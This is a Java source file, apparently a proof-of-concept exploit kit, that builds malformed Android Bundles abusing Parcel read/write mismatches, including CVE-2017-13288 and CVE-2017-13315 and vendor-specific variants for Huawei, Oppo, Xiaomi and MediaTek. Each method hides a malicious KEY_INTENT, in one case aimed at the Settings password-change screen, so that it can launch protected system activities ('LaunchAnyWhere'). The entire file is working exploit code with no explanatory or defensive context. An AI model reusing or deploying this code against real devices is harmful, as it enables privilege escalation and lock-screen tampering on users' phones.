package com.example.launchanywherebyevilparcel1999;

import android.accounts.AccountManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

public class EvilBundle {
    private Context mContext;
    public EvilBundle(Context context) {
        mContext=context;
    }
    public Bundle makeBundle(Intent intent,String name){

        Bundle evil = new Bundle();
        Parcel bndlData = Parcel.obtain();
        Parcel pcelData = Parcel.obtain();
        Parcel pceltmp = Parcel.obtain();
        if (name.equals("CVE-2017-13288")){
            pcelData.writeInt(2);  // 键值对的数量：2
            // 写入第一个键值对
            pcelData.writeString("mismatch");
            pcelData.writeInt(4);  // VAL_PARCELABLE
            pcelData.writeString("android.bluetooth.le.PeriodicAdvertisingReport"); // Class Loader
            pcelData.writeInt(1);  // syncHandle
            pcelData.writeInt(1);  // txPower
            pcelData.writeInt(1);  // rssi
            pcelData.writeInt(1);  // dataStatus
            pcelData.writeInt(1);  // flag
            pcelData.writeInt(-1); // 恶意KEY_INTENT的长度，暂时写入-1

            int keyIntentStartPos=pcelData.dataPosition(); // KEY_INTENT的起始位置
            pcelData.writeString(AccountManager.KEY_INTENT);
            pcelData.writeInt(4);  // VAL_PARCELABLE
            pcelData.writeString("android.content.Intent");  // Class Loader

            intent.writeToParcel(pceltmp,0);
            pcelData.appendFrom(pceltmp,0,pcelData.dataSize());

             /*
            pcelData.writeString(Intent.ACTION_RUN);  // Intent Action
            Uri.writeToParcel(pcelData,null);  // uri = null
            pcelData.writeString(null);  // mType = null
            pcelData.writeInt(0x10000000);  // Flags
            pcelData.writeString(null);  // mPackage = null

            pcelData.writeString("com.android.settings");
            pcelData.writeString("com.android.settings.password.ChooseLockPassword");
            pcelData.writeInt(0);  // mSourceBounds = null
            pcelData.writeInt(0);  // mCategories = null
            pcelData.writeInt(0);  // mSelector = null
            pcelData.writeInt(0);  // mClipData = null
            pcelData.writeInt(-2); // mContentUserHint
            */

            pcelData.writeBundle(null);
            int keyIntentEndPos=pcelData.dataPosition(); // KEY_INTENT的终止位置
            int lengthOfKeyIntent=keyIntentEndPos-keyIntentStartPos; // 计算KEY_INTENT的长度
            pcelData.setDataPosition(keyIntentStartPos-4);  // 将指针移到KEY_INTENT长度处
            pcelData.writeInt(lengthOfKeyIntent);  // 写入KEY_INTENT的长度
            pcelData.setDataPosition(keyIntentEndPos);
            // 写入第二个键值对
            pcelData.writeString("Padding-Key");
            pcelData.writeInt(0);  // VAL_STRING
            pcelData.writeString("Padding-Value");
            int length = pcelData.dataSize();

            bndlData.writeInt(length);
            bndlData.writeInt(0x4c444e42);  // Bundle魔数
            bndlData.appendFrom(pcelData,0,length);
            bndlData.setDataPosition(0);
            byte[] raw = bndlData.marshall();//序列化
            FileOutputStream fos = null;
            try {
                fos  = mContext.openFileOutput("debug.pcl", Context.MODE_PRIVATE);
                fos.write(raw);
                fos.close();
            } catch (FileNotFoundException e) {
                throw new RuntimeException(e);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            evil.readFromParcel(bndlData);
        } else if (name.equals("GoogleBug7699048")) {

        } else if (name.equals("CVE-2017-13315")) {
            pcelData.writeInt(3); // 键值对的数量：3
            // 写入第一个键值对
            pcelData.writeString("mismatch");
            pcelData.writeInt(4);  // VAL_PACELABLE
            pcelData.writeString("com.android.internal.telephony.DcParamObject"); // Class Loader
            pcelData.writeInt(1);  //mSubId

            // 写入第二个键值对
            pcelData.writeInt(1);
            pcelData.writeInt(6);
            pcelData.writeInt(13); // VAL_BYTEARRAY
            //pcelData.writeInt(0x144); //KEY_INTENT:intent的长度
            pcelData.writeInt(-1); // KEY_INTENT的长度，暂时写入-1，后续再进行修改
            int keyIntentStartPos = pcelData.dataPosition(); // KEY_INTENT的起始位置
            // 恶意Intent隐藏在byte数组中
            pcelData.writeString(AccountManager.KEY_INTENT);
            pcelData.writeInt(4);
            pcelData.writeString("android.content.Intent");// Class Loader
            pcelData.writeString(Intent.ACTION_RUN); // Intent Action
            Uri.writeToParcel(pcelData, null); // Uri = null
            pcelData.writeString(null); // mType = null
            pcelData.writeInt(0x10000000); // Flags
            pcelData.writeString(null); // mPackage = null
            pcelData.writeString("com.android.settings");
            pcelData.writeString("com.android.settings.password.ChooseLockPassword");
            pcelData.writeInt(0); //mSourceBounds = null
            pcelData.writeInt(0); // mCategories = null
            pcelData.writeInt(0); // mSelector = null
            pcelData.writeInt(0); // mClipData = null
            pcelData.writeInt(-2); // mContentUserHint
            pcelData.writeBundle(null);

            int keyIntentEndPos = pcelData.dataPosition(); // KEY_INTENT的终止位置
            int lengthOfKeyIntent = keyIntentEndPos - keyIntentStartPos; // 计算KEY_INTENT的长度
            pcelData.setDataPosition(keyIntentStartPos - 4);  // 将指针移到KEY_INTENT长度处
            pcelData.writeInt(lengthOfKeyIntent);  // 写入KEY_INTENT的长度
            pcelData.setDataPosition(keyIntentEndPos);

            // 写入第三个键值对
            pcelData.writeString("Padding-Key");
            pcelData.writeInt(0); // VAL_STRING
            pcelData.writeString("Padding-Value"); //
            int length  = pcelData.dataSize();

            bndlData.writeInt(length);
            bndlData.writeInt(0x4c444E42);
            bndlData.appendFrom(pcelData, 0, length);
            bndlData.setDataPosition(0);
            evil.readFromParcel(bndlData);
        }

        return evil;

    }

    public Bundle makeBundleForHuaweiForN(Intent intent) {
        Bundle bundle = new Bundle();
        Parcel obtain = Parcel.obtain();
        Parcel obtain2 = Parcel.obtain();
        Parcel obtain3 = Parcel.obtain();
        obtain2.writeInt(3);
        obtain2.writeInt(8);
        obtain2.writeInt(8);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(4);
        obtain2.writeString("com.android.internal.widget.VerifyCredentialResponse");
        obtain2.writeInt(0);
        obtain2.writeInt(-1);
        obtain2.writeInt(8);
        obtain2.writeInt(8);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(11);
        obtain2.writeInt(0);
        obtain2.writeInt(1);
        obtain2.writeInt(0);
        obtain2.writeInt(8);
        obtain2.writeInt(6);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(5);
        obtain2.writeInt(0);
        obtain2.writeInt(13);
        obtain2.writeInt(-1);
        int dataPosition = obtain2.dataPosition();
        obtain2.writeString("intent");
        obtain2.writeInt(4);
        obtain2.writeString("android.content.Intent");
        intent.writeToParcel(obtain3, 0);
        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
        int dataPosition2 = obtain2.dataPosition();
        obtain2.setDataPosition(dataPosition - 4);
        obtain2.writeInt(dataPosition2 - dataPosition);
        obtain2.setDataPosition(dataPosition2);
        int dataSize = obtain2.dataSize();
        obtain.writeInt(dataSize);
        obtain.writeInt(0x4c444E42);
        obtain.appendFrom(obtain2, 0, dataSize);
        obtain.setDataPosition(0);
        bundle.readFromParcel(obtain);
        return bundle;
    }

    public static int[] b(String str) {
        String[] split = str.split(",");
        int length = split.length;
        int[] iArr = new int[length];
        for (int i = 0; i < length; i++) {
            //iArr[i] = NumberUtils.instance().parseInt(split[i]);
        }
        return iArr;
    }
    public static void a(Parcel parcel, String str) {
        try {
            for (int i : b(str)) {
                parcel.writeInt(i);
            }
        } catch (Throwable th) {

        }
    }

    public Bundle makeBundleForHuaweiSinceO(Intent intent) {
        Bundle bundle = new Bundle();
        Parcel obtain = Parcel.obtain();
        Parcel obtain2 = Parcel.obtain();
        Parcel obtain3 = Parcel.obtain();
        obtain2.writeInt(3);
        obtain2.writeInt(4);
        obtain2.writeInt(13);
        obtain2.writeInt(3);
        obtain2.writeInt(0);
        obtain2.writeInt(4);
        obtain2.writeString("com.huawei.recsys.aidl.HwObjectContainer");
        obtain2.writeSerializable(null);
        obtain2.writeInt(4);
        obtain2.writeInt(13);
        obtain2.writeInt(36);
        obtain2.writeInt(0);
        obtain2.writeInt(1);
        obtain2.writeInt(1);
        obtain2.writeInt(4);
        obtain2.writeInt(13);
        obtain2.writeInt(66);
        obtain2.writeInt(0);
        obtain2.writeInt(13);
        obtain2.writeInt(-1);
        int dataPosition = obtain2.dataPosition();
        obtain2.writeString("intent");
        obtain2.writeInt(4);
        obtain2.writeString("android.content.Intent");
        intent.writeToParcel(obtain3, 0);
        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
        int dataPosition2 = obtain2.dataPosition();
        obtain2.setDataPosition(dataPosition - 4);
        obtain2.writeInt(dataPosition2 - dataPosition);
        obtain2.setDataPosition(dataPosition2);
        int dataSize = obtain2.dataSize();
        obtain.writeInt(dataSize);
        obtain.writeInt(0x4c444E42);
        obtain.appendFrom(obtain2, 0, dataSize);
        obtain.setDataPosition(0);
        bundle.readFromParcel(obtain);
        return bundle;
    }

    public Bundle makeBundleForWorkSource(Intent intent) {
        Bundle bundle = new Bundle();
        Parcel obtain = Parcel.obtain();
        Parcel obtain2 = Parcel.obtain();
        Parcel obtain3 = Parcel.obtain();
        obtain2.writeInt(3);
        //first key val
        obtain2.writeInt(13);//key len
        obtain2.writeInt(2);//key val start
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(6);
        obtain2.writeInt(0);
        obtain2.writeInt(0);//key val end
        obtain2.writeInt(4);//val class type
        obtain2.writeString("android.os.WorkSource");
        obtain2.writeInt(-1);//mNum int
        obtain2.writeInt(-1);//muid int[] -1表示数组的结束
        obtain2.writeInt(-1);//mNames string[] 表示null
        obtain2.writeInt(1);//numChains
        obtain2.writeInt(-1);//mchain ArrayList<workchain>
        //second key val
        obtain2.writeInt(13);//second key len
        obtain2.writeInt(13);
        obtain2.writeInt(68);
        obtain2.writeInt(11);
        obtain2.writeInt(0);
        obtain2.writeInt(7);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(1);//val type int
        obtain2.writeInt(1);//val
        ////third key-value
        obtain2.writeInt(13);
        obtain2.writeInt(22);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(13);//val type: bytearray
        obtain2.writeInt(-1);//evil intent length
        int dataPosition = obtain2.dataPosition();
        // 恶意Intent隐藏在byte数组中
        obtain2.writeString("intent");//bytearray val
        obtain2.writeInt(4);
        obtain2.writeString("android.content.Intent");
        intent.writeToParcel(obtain3, 0);
        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
        int dataPosition2 = obtain2.dataPosition();
        obtain2.setDataPosition(dataPosition - 4);
        obtain2.writeInt(dataPosition2 - dataPosition);
        obtain2.setDataPosition(dataPosition2);
        int dataSize = obtain2.dataSize();
        obtain.writeInt(dataSize);//bundle size
        obtain.writeInt(0x4c444E42);//bundle magic word
        obtain.appendFrom(obtain2, 0, dataSize);
        obtain.setDataPosition(0);
        bundle.readFromParcel(obtain);
        return bundle;
    }

    public Bundle debugForWorkSource(Intent intent) {
        Bundle bundle = new Bundle();
        Parcel obtain = Parcel.obtain();
        Parcel obtain2 = Parcel.obtain();
        Parcel obtain3 = Parcel.obtain();
        obtain2.writeInt(3);
        //first key val
        obtain2.writeString("mismatch");
        obtain2.writeInt(4);//val class type
        obtain2.writeString("android.os.WorkSource");
        obtain2.writeInt(-1);//mNum int
        obtain2.writeInt(-1);//muid int[] -1表示数组的结束
        obtain2.writeInt(-1);//mNames string[] 表示null
        obtain2.writeInt(1);//numChains
        obtain2.writeInt(-1);//

        //second key val
        obtain2.writeInt(13);//
        obtain2.writeInt(13);//
        obtain2.writeInt(68);
        obtain2.writeInt(11);
        obtain2.writeInt(0);
        obtain2.writeInt(7);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(1);
        obtain2.writeInt(1);


        //third key-value
        obtain2.writeInt(13);
        obtain2.writeInt(22);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(13);//bytearray type
        obtain2.writeInt(-1);//evil intent length
        int dataPosition = obtain2.dataPosition();
        // 恶意Intent隐藏在byte数组中
        obtain2.writeString("intent");//bytearray val
        obtain2.writeInt(4);
        obtain2.writeString("android.content.Intent");
        intent.writeToParcel(obtain3, 0);
        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
        int dataPosition2 = obtain2.dataPosition();
        obtain2.setDataPosition(dataPosition - 4);
        obtain2.writeInt(dataPosition2 - dataPosition);

        obtain2.setDataPosition(dataPosition2);

        int dataSize = obtain2.dataSize();
        obtain.writeInt(dataSize);
        obtain.writeInt(0x4c444E42);
        obtain.appendFrom(obtain2, 0, dataSize);
        obtain.setDataPosition(0);
        bundle.readFromParcel(obtain);
        return bundle;
    }

    //unkown avaiable??????
    public Bundle makeBundleForOppoForR(Intent intent) {
        Bundle bundle = new Bundle();
        Parcel obtain = Parcel.obtain();
        Parcel obtain2 = Parcel.obtain();
        Parcel obtain3 = Parcel.obtain();
        obtain2.writeInt(49);
        obtain2.writeString("11");
        obtain2.writeInt(4);
        obtain2.writeString("com.oplus.orms.info.OrmsNotifyParam");
        obtain2.writeInt(3);
        obtain2.writeInt(13107);
        obtain2.writeInt(0);
        obtain2.writeInt(6);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(3);
        obtain2.writeInt(13105);
        obtain2.writeInt(6);
        obtain2.writeInt(13);
        obtain2.writeInt(-1);
        int dataPosition = obtain2.dataPosition();
        obtain2.writeString("intent");
        obtain2.writeInt(4);
        obtain2.writeString("android.content.Intent");
        intent.writeToParcel(obtain3, 0);
        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
        int dataPosition2 = obtain2.dataPosition();
        obtain2.setDataPosition(dataPosition - 4);
        obtain2.writeInt(dataPosition2 - dataPosition);
        obtain2.setDataPosition(dataPosition2);
        for (int i = 0; i < 49 - 3; i++) {
            obtain2.writeString("44" + i);
            obtain2.writeInt(1);
            obtain2.writeInt(i);
        }
        int dataSize = obtain2.dataSize();
        obtain.writeInt(dataSize);
        obtain.writeInt(0x4c444E42);
        obtain.appendFrom(obtain2, 0, dataSize);
        obtain.setDataPosition(0);
        bundle.readFromParcel(obtain);
        return bundle;
    }

    public Bundle makeBundleForOppoSinceOToQ(Intent intent, String str) {
        Bundle bundle = new Bundle();
        Parcel obtain = Parcel.obtain();
        Parcel obtain2 = Parcel.obtain();
        Parcel obtain3 = Parcel.obtain();
        obtain2.writeInt(3);
        obtain2.writeInt(13);
        obtain2.writeInt(72);
        obtain2.writeInt(3);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(4);
        if ("com.mediatek.internal.telephony.ims.MtkDedicateDataCallResponse".equals(str)) {
            obtain2.writeString("com.mediatek.internal.telephony.ims.MtkDedicateDataCallResponse");
            for (int i = 0; i < 9; i++) {
                obtain2.writeInt(0);
            }
            obtain2.writeInt(1);
            obtain2.writeString(null);
        } else {
            obtain2.writeString("com.android.internal.telephony.OperatorInfo");
            obtain2.writeString("");
            obtain2.writeString("");
            obtain2.writeString("");
            obtain2.writeSerializable(null);
        }
        obtain2.writeInt(13);
        obtain2.writeInt(72);
        obtain2.writeInt(53);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(1);
        obtain2.writeInt(1);
        obtain2.writeInt(13);
        obtain2.writeInt(72);
        obtain2.writeInt(48);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(13);
        obtain2.writeInt(-1);
        int dataPosition = obtain2.dataPosition();
        obtain2.writeString("intent");
        obtain2.writeInt(4);
        obtain2.writeString("android.content.Intent");
        intent.writeToParcel(obtain3, 0);
        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
        int dataPosition2 = obtain2.dataPosition();
        obtain2.setDataPosition(dataPosition - 4);
        obtain2.writeInt(dataPosition2 - dataPosition);
        obtain2.setDataPosition(dataPosition2);
        int dataSize = obtain2.dataSize();
        obtain.writeInt(dataSize);
        obtain.writeInt(0x4c444E42);
        obtain.appendFrom(obtain2, 0, dataSize);
        obtain.setDataPosition(0);
        bundle.readFromParcel(obtain);
        return bundle;
    }
    public Bundle makeBundleForMiMTK(Intent intent) {
        Bundle bundle = new Bundle();
        Parcel obtain = Parcel.obtain();
        Parcel obtain2 = Parcel.obtain();
        Parcel obtain3 = Parcel.obtain();
        obtain2.writeInt(3);
        obtain2.writeInt(13);
        obtain2.writeInt(72);
        obtain2.writeInt(3);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(4);
        obtain2.writeString("com.mediatek.internal.telephony.ims.MtkDedicateDataCallResponse");
        for (int i = 0; i < 9; i++) {
            obtain2.writeInt(0);
        }
        obtain2.writeInt(1);
        obtain2.writeString(null);
        obtain2.writeInt(13);
        obtain2.writeInt(72);
        obtain2.writeInt(53);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(1);
        obtain2.writeInt(1);
        obtain2.writeInt(13);
        obtain2.writeInt(72);
        obtain2.writeInt(48);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(13);
        obtain2.writeInt(-1);
        int dataPosition = obtain2.dataPosition();
        obtain2.writeString("intent");
        obtain2.writeInt(4);
        obtain2.writeString("android.content.Intent");
        intent.writeToParcel(obtain3, 0);
        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
        int dataPosition2 = obtain2.dataPosition();
        obtain2.setDataPosition(dataPosition - 4);
        obtain2.writeInt(dataPosition2 - dataPosition);
        obtain2.setDataPosition(dataPosition2);
        int dataSize = obtain2.dataSize();
        obtain.writeInt(dataSize);
        obtain.writeInt(0x4c444E42);
        obtain.appendFrom(obtain2, 0, dataSize);
        obtain.setDataPosition(0);
        bundle.readFromParcel(obtain);
        return bundle;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public Bundle makeBundleForMiR(Intent intent) {
        Bundle bundle = new Bundle();
        Parcel obtain = Parcel.obtain();
        Parcel obtain2 = Parcel.obtain();
        Parcel obtain3 = Parcel.obtain();
        obtain2.writeInt(3);
        obtain2.writeInt(13);
        obtain2.writeInt(32);
        obtain2.writeInt(1);
        obtain2.writeInt(-1);
        obtain2.writeInt(0);
        obtain2.writeInt(6);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(4);
        obtain2.writeString("android.content.pm.parsing.component.ParsedIntentInfo");
        new IntentFilter().writeToParcel(obtain2, 0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(1);
        obtain2.writeInt(-1);
        obtain2.writeInt(0);
        obtain2.writeInt(13);
        obtain2.writeInt(32);
        obtain2.writeInt(1);
        obtain2.writeInt(-1);
        obtain2.writeInt(0);
        obtain2.writeInt(7);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(1);
        obtain2.writeInt(1);
        obtain2.writeInt(13);
        obtain2.writeInt(32);
        obtain2.writeInt(1);
        obtain2.writeInt(-1);
        obtain2.writeInt(0);
        obtain2.writeInt(8);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(13);
        obtain2.writeInt(-1);
        int dataPosition = obtain2.dataPosition();
        obtain2.writeString("intent");
        obtain2.writeInt(4);
        obtain2.writeString("android.content.Intent");
        intent.writeToParcel(obtain3, 0);
        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
        int dataPosition2 = obtain2.dataPosition();
        obtain2.setDataPosition(dataPosition - 4);
        obtain2.writeInt(dataPosition2 - dataPosition);
        obtain2.setDataPosition(dataPosition2);
        int dataSize = obtain2.dataSize();
        obtain.writeInt(dataSize);
        obtain.writeInt(0x4c444E42);
        obtain.appendFrom(obtain2, 0, dataSize);
        obtain.setDataPosition(0);
        bundle.readFromParcel(obtain);
        return bundle;
    }
}
